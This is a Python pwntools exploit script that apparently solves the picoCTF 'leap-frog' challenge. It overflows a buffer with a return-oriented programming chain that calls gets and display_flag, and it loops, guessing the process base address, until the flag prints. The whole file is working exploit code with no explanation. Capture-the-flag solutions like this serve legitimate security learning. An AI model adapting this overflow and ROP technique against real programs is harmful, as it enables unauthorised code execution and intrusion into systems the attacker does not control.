from pwn import *

remote = True
context.log_level = 'error'

path = "/problems/leap-frog_6_772f62cb51a325a368a9d1563bf4058a"

if remote:
    elf = ELF("{}/rop".format(path))
else:
    elf = ELF("./rop")

rop_pop_ebx = 0x000004d5
if remote:
    proc_base = 0x56591000
else:
    proc_base = 0x56555000
payload = "A"*0x1c
payload += p32(proc_base + rop_pop_ebx)
payload += p32(proc_base + 0x1fb4)
payload += p32(proc_base + elf.plt["gets"])
payload += p32(proc_base + elf.symbols["display_flag"])
payload += p32(proc_base + 0x2009)
assert '\n' not in payload

while True:
    if remote:
        sock = process("{}/rop".format(path), cwd=path)
    else:
        sock = process("./rop")
    sock.sendlineafter("> ", payload)
    sock.sendline("\x01\x01\x01")
    try:
        r = sock.recvline_contains('picoCTF', timeout=1)
        print(r)
        if r: break
    except EOFError:
        sock.close()
